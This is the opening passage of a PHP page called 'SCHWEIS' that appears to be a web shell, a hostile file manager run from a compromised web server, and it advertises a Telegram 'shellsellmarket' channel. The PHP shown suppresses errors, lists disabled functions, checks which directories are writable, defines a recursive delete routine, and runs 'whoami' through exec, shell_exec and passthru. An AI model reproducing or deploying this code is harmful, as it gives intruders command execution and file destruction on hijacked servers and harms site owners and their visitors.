<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SCHWEIS</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0e1a;
            --bg-secondary: #121620;
            --bg-tertiary: #1a1f2e;
            --bg-hover: #252b3a;
            --accent: #4a90e2;
            --accent-hover: #357abd;
            --accent-glow: rgba(74, 144, 226, 0.3);
            --accent-light: rgba(74, 144, 226, 0.15);
            --success: #22c55e;
            --warning: #f59e0b;
            --error: #ef4444;
            --text-primary: #fafafa;
            --text-secondary: #b0b8c4;
            --text-muted: #6b7280;
            --border: #1f2937;
            --border-light: #374151;
            --radius-sm: 6px;
            --radius-md: 10px;
            --radius-lg: 14px;
            --transition: 0.2s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            line-height: 1.5;
        }

        /* Arka Plan Resmi - Base64'u buraya koy */
        .app-background {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            /* BASE64_PLACEHOLDER: Asagidaki yorumu sil ve base64'u ekle */
            background-image: url('data:image/jpeg;base64,');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            z-index: -1;
            opacity: 0.20;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(ellipse at 20% 20%, rgba(74, 144, 226, 0.06) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 80%, rgba(74, 144, 226, 0.04) 0%, transparent 50%);
            pointer-events: none;
            z-index: -1;
        }

        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg-secondary);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--border-light);
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-muted);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            background: linear-gradient(135deg, rgba(18, 22, 32, 0.85) 0%, rgba(26, 31, 46, 0.85) 100%);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: var(--radius-lg);
            padding: 24px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, #2d5a8a, var(--accent), #6bb3f0);
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 3px;
            background: linear-gradient(135deg, #6bb3f0 0%, var(--accent) 50%, #2d5a8a 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 20px;
            display: inline-block;
        }

        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 12px;
            margin-top: 16px;
        }

        .info-line {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            padding: 10px 14px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: var(--radius-sm);
            font-size: 12px;
        }

        .info-label {
            color: var(--accent);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            min-width: 70px;
            flex-shrink: 0;
        }

        .info-value {
            color: var(--text-secondary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            word-break: break-all;
        }

        .writable {
            color: #00ff41 !important;
            font-weight: 700;
            text-shadow: 0 0 8px rgba(0, 255, 65, 0.6);
            font-family: 'JetBrains Mono', monospace;
            letter-spacing: 0.5px;
        }

        .readonly {
            color: #ff3333 !important;
            font-weight: 700;
            text-shadow: 0 0 8px rgba(255, 50, 50, 0.6);
            font-family: 'JetBrains Mono', monospace;
            letter-spacing: 0.5px;
        }

        .breadcrumb {
            background: rgba(18, 22, 32, 0.75);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: var(--radius-md);
            padding: 14px 18px;
            margin-bottom: 20px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            color: var(--text-muted);
            overflow-x: auto;
            white-space: nowrap;
        }

        .breadcrumb a {
            color: var(--accent);
            text-decoration: none;
            transition: var(--transition);
            padding: 2px 4px;
            border-radius: 4px;
        }

        .breadcrumb a:hover {
            color: var(--text-primary);
            background: var(--accent-light);
        }

        .upload-section, .edit-form, .file-preview {
            background: rgba(18, 22, 32, 0.80);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: var(--radius-lg);
            padding: 20px;
            margin-bottom: 20px;
        }

        .section-title {
            font-size: 13px;
            font-weight: 700;
            color: var(--text-secondary);
            letter-spacing: 1.5px;
            text-transform: uppercase;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border);
        }

        .section-title::before {
            content: '';
            width: 4px;
            height: 16px;
            background: linear-gradient(180deg, #6bb3f0, var(--accent));
            border-radius: 2px;
        }

        .form-row {
            margin-bottom: 14px;
        }

        .radio-group {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }

        .radio-item {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px 16px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border);
            border-radius: var(--radius-md);
            cursor: pointer;
            transition: var(--transition);
            font-size: 13px;
            color: var(--text-secondary);
        }

        .radio-item:hover {
            border-color: var(--accent);
            background: var(--bg-hover);
        }

        .radio-item input[type="radio"] {
            appearance: none;
            -webkit-appearance: none;
            width: 16px;
            height: 16px;
            border: 2px solid var(--border-light);
            border-radius: 50%;
            background: transparent;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
        }

        .radio-item input[type="radio"]:checked {
            border-color: var(--accent);
        }

        .radio-item input[type="radio"]:checked::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 6px;
            height: 6px;
            background: var(--accent);
            border-radius: 50%;
        }

        .upload-row {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
        }

        input[type="file"] {
            flex: 1;
            min-width: 200px;
            padding: 10px 14px;
            background: var(--bg-tertiary);
            border: 1px dashed var(--border-light);
            border-radius: var(--radius-md);
            color: var(--text-primary);
            font-size: 13px;
            cursor: pointer;
            transition: var(--transition);
        }

        input[type="file"]:hover {
            border-color: var(--accent);
            background: var(--bg-hover);
        }

        input[type="file"]::file-selector-button {
            background: var(--accent);
            color: white;
            border: none;
            padding: 6px 14px;
            border-radius: var(--radius-sm);
            cursor: pointer;
            font-weight: 500;
            margin-right: 12px;
            transition: var(--transition);
        }

        input[type="file"]::file-selector-button:hover {
            background: var(--accent-hover);
        }

        input[type="text"], input[type="password"] {
            flex: 1;
            min-width: 150px;
            padding: 10px 14px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border);
            border-radius: var(--radius-md);
            color: var(--text-primary);
            font-size: 13px;
            font-family: 'JetBrains Mono', monospace;
            transition: var(--transition);
        }

        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px var(--accent-light);
        }

        input[type="text"]::placeholder {
            color: var(--text-muted);
        }

        textarea {
            width: 100%;
            min-height: 400px;
            padding: 16px;
            background: var(--bg-primary);
            border: 1px solid var(--border);
            border-radius: var(--radius-md);
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.6;
            resize: vertical;
            margin-bottom: 14px;
        }

        textarea:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px var(--accent-light);
        }

        .btn {
            padding: 10px 18px;
            border: none;
            border-radius: var(--radius-md);
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-family: inherit;
            background: var(--bg-hover);
            color: var(--text-primary);
            border: 1px solid var(--border-light);
        }

        .btn:hover {
            background: var(--border-light);
            transform: translateY(-1px);
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--accent) 0%, #357abd 100%);
            color: white;
            border: none;
            box-shadow: 0 4px 12px var(--accent-glow);
        }

        .btn-primary:hover {
            box-shadow: 0 6px 20px var(--accent-glow);
            transform: translateY(-2px);
        }

        .message {
            padding: 14px 18px;
            border-radius: var(--radius-md);
            margin-bottom: 16px;
            font-size: 13px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .message::before {
            font-size: 16px;
        }

        .message-success {
            background: rgba(34, 197, 94, 0.15);
            border: 1px solid rgba(34, 197, 94, 0.3);
            color: var(--success);
        }

        .message-success::before {
            content: '✓';
        }

        .message-error {
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: var(--error);
        }

        .message-error::before {
            content: '✕';
        }

        .file-preview pre {
            background: var(--bg-primary);
            border: 1px solid var(--border);
            border-radius: var(--radius-md);
            padding: 16px;
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            line-height: 1.6;
            color: var(--text-secondary);
            max-height: 500px;
            overflow-y: auto;
        }

        .file-table {
            background: rgba(18, 22, 32, 0.80);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: var(--radius-lg);
            overflow: hidden;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            background: linear-gradient(180deg, var(--bg-tertiary) 0%, rgba(30, 36, 50, 0.95) 100%);
            padding: 14px 16px;
            text-align: left;
            font-size: 11px;
            font-weight: 700;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.8px;
            border-bottom: 1px solid var(--border);
            position: sticky;
            top: 0;
            z-index: 10;
        }

        td {
            padding: 12px 16px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            font-size: 13px;
            vertical-align: middle;
        }

        tbody tr {
            transition: var(--transition);
        }

        tbody tr:hover {
            background: rgba(74, 144, 226, 0.08);
        }

        tbody tr:nth-child(even) {
            background: rgba(255, 255, 255, 0.02);
        }

        tbody tr:nth-child(even):hover {
            background: rgba(74, 144, 226, 0.08);
        }

        .file-link {
            color: var(--text-primary);
            text-decoration: none;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            transition: var(--transition);
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .file-link:hover {
            color: var(--accent);
        }

        .dir-link {
            color: #fbbf24;
        }

        .dir-link:hover {
            color: #fcd34d;
        }

        .size {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            color: var(--text-muted);
        }

        td.permissions {
            text-align: center;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            font-weight: 600;
        }

        .perm-writable {
            color: var(--success);
        }

        .perm-readonly {
            color: var(--error);
        }

        .action-form {
            display: flex;
            gap: 6px;
            align-items: center;
        }

        select {
            padding: 6px 10px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            color: var(--text-primary);
            font-size: 12px;
            cursor: pointer;
            font-family: 'JetBrains Mono', monospace;
            min-width: 70px;
        }

        select:focus {
            outline: none;
            border-color: var(--accent);
        }

        select option {
            background: var(--bg-tertiary);
            color: var(--text-primary);
        }

        .footer {
            text-align: center;
            padding: 24px;
            margin-top: 20px;
        }

        .telegram-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 12px 24px;
            background: linear-gradient(135deg, #0088cc 0%, #00a6ed 100%);
            color: white;
            text-decoration: none;
            border-radius: var(--radius-md);
            font-weight: 600;
            font-size: 14px;
            transition: var(--transition);
            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
        }

        .telegram-link:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 25px rgba(0, 136, 204, 0.4);
        }

        @media (max-width: 768px) {
            .container {
                padding: 12px;
            }
            
            .header {
                padding: 16px;
            }
            
            .title {
                font-size: 24px;
            }
            
            .system-info {
                grid-template-columns: 1fr;
            }
            
            .upload-row {
                flex-direction: column;
            }
            
            input[type="file"], input[type="text"] {
                width: 100%;
            }
            
            .radio-group {
                flex-direction: column;
            }
            
            .radio-item {
                width: 100%;
            }
            
            th, td {
                padding: 10px 12px;
                font-size: 11px;
            }
            
            .action-form {
                flex-direction: column;
                gap: 4px;
            }
            
            select, .btn {
                width: 100%;
            }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .container > * {
            animation: fadeIn 0.4s ease forwards;
        }

        .container > *:nth-child(1) { animation-delay: 0.05s; }
        .container > *:nth-child(2) { animation-delay: 0.1s; }
        .container > *:nth-child(3) { animation-delay: 0.15s; }
        .container > *:nth-child(4) { animation-delay: 0.2s; }
    </style>
</head>
<body>
    <!-- Arka plan resmi: Base64'u .app-background CSS'ine koy -->
    <div class="app-background"></div>
    <div class="container">
        <div class="header">
            <div class="title">SCHWEIS</div>
            <?php
            set_time_limit(0);
            error_reporting(0);
            ini_set('display_errors', 0);

            $disfunc = @ini_get("disable_functions");
            if (empty($disfunc)) {
                $disf = "<span class='writable'>NONE</span>";
            } else {
                $disf = "<span class='readonly'>".$disfunc."</span>";
            }

            function author() {
                echo '<div class="footer">
                        <a href="https://t.me/shellsellmarket" class="telegram-link" target="_blank">
                            <span>Telegram</span>
                        </a>
                      </div>';
                exit();
            }

            function cekdir() {
                if (isset($_GET['path'])) {
                    $lokasi = $_GET['path'];
                } else {
                    $lokasi = getcwd();
                }
                if (is_writable($lokasi)) {
                    return "<span class='writable'>writable</span>";
                } else {
                    return "<span class='readonly'>readonly</span>";
                }
            }

            function cekroot() {
                if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
                    return "<span class='writable'>writable</span>";
                } else {
                    return "<span class='readonly'>readonly</span>";
                }
            }

            function xrmdir($dir) {
                $items = scandir($dir);
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') {
                        continue;
                    }
                    $path = $dir.'/'.$item;
                    if (is_dir($path)) {
                        xrmdir($path);
                    } else {
                        unlink($path);
                    }
                }
                rmdir($dir);
            }

            function green($text) {
                echo "<div class='message message-success'>".$text."</div>";
            }

            function red($text) {
                echo "<div class='message message-error'>".$text."</div>";
            }
            ?>

            <div class="system-info">
                <div class="info-line">
                    <span class="info-label">Server:</span>
                    <span class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">System:</span>
                    <span class="info-value"><?php echo php_uname(); ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">User:</span>
                    <span class="info-value"><?php
                        $u = '';
                        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
                            $pw = @posix_getpwuid(@posix_geteuid());
                            if ($pw && !empty($pw['name'])) $u = $pw['name'] . ' (' . @posix_geteuid() . ')';
                        }
                        if (empty(trim($u)) && function_exists('exec')) { @exec('whoami', $o); $u = isset($o[0]) ? trim($o[0]) : ''; }
                        if (empty(trim($u)) && function_exists('shell_exec')) { $u = @trim(@shell_exec('whoami 2>/dev/null')); }
                        if (empty(trim($u)) && function_exists('passthru')) { ob_start(); @passthru('whoami 2>/dev/null'); $u = trim(ob_get_clean()); }
                        if (empty(trim($u))) { $cu = @get_current_user(); if (!empty($cu)) $u = $cu . ' (' . @getmyuid() . ')'; }
                        if (empty(trim($u))) { $u = @getenv('USER') ?: @getenv('USERNAME') ?: @getenv('APACHE_RUN_USER') ?: 'restricted'; }
                        echo $u;
                    ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">PHP:</span>
                    <span class="info-value"><?php echo @phpversion(); ?></span>
                </div>
                <div class="info-line" style="grid-column: 1 / -1;">
                    <span class="info-label">Disabled:</span>
                    <span class="info-value"><?php echo $disf; ?></span>
                </div>
            </div>
        </div>

